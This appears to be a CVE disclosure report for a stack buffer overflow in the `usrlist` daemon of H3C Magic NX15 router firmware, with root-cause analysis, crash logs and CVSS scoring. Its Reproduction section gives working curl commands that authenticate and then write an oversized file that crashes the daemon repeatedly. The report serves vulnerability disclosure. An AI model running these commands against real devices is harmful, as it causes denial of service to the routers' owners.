# Post-auth Denial of Service via `usrlist` stack buffer overflow

## Submission Type

- Category: CVE
- Language: English
- Product: H3C Magic NX15 Router
- Affected firmware: NX15V100R017 / R017
- Main report: `report/postauth_usrlist_stack_overflow_report.md`
- PoC: `poc/postauth_usrlist_stack_overflow.py`

## Classification

This issue is classified as CVE because it is a stack-based buffer overflow in a
native daemon (`/usr/bin/usrlist`) that is triggered automatically by a 1-second
timer callback, causing a persistent crash-restart loop.

**Impact is claimed as denial of service only.** Although the binary is built
without stack protection and without `_FORTIFY_SOURCE`, control-flow hijacking
could **not** be achieved: the accumulation buffer overlaps the source buffer
used by `strcat`, so the function aborts inside libc before it can reach
`jr $ra`. See the report for the full reasoning and the observed crash evidence.

## Summary

In `sub_416874` of `/usr/bin/usrlist`, every line read from
`/var/run/agentlist` is accumulated into a 1024-byte stack buffer with `strcat`
(`0x416C28`), plus two extra bytes per line, with no bounds check. Content whose
lines sum to more than 1024 bytes overflows the buffer and overwrites saved stack
data. The file is read from a 1-second timer callback and the process is
respawned by `procd`, producing a crash-restart loop.

## Reproduction

See `report/` for the full analysis and `poc/` for a runnable script.

```bash
T=$(curl -s -X POST -H 'Content-Type: application/json' \
      -d '{"username":"H3C","password":"<admin>"}' \
      http://<target>/api/login/auth | sed -n 's/.*"session":"\([^"]*\)".*/\1/p')

# 16 lines x 120 characters = 1936 bytes, well past the 1024-byte buffer
curl -s -X POST -H 'Content-Type: application/json' -H "AUTHENTICATION: $T" \
  -d '[{"id":1,"object":"file","method":"write","param":{"path":"/var/run/agentlist","data":"<120 chars>\n... x16"}}]' \
  http://<target>/api/esps
```

Observed kernel log:

```text
do_page_fault(): sending SIGSEGV to usrlist for invalid write access to 7fa53000
epc = 775bf298 in libuClibc-0.9.33.so[77580000+76000]
ra  = 00416c30 in usrlist[400000+21000]
```

## Metrics

```text
CWE-121  Stack-based Buffer Overflow
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H   (4.9)
```

## Notes

The `C:N/I:N` and `A:H` values are deliberate: only denial of service was
demonstrated. The related command injection in the same function is reported
separately (`usrlist_cmdi_root_rce`), where execution as root **is** proven.

Companion analysis: the sibling directories in this repository.
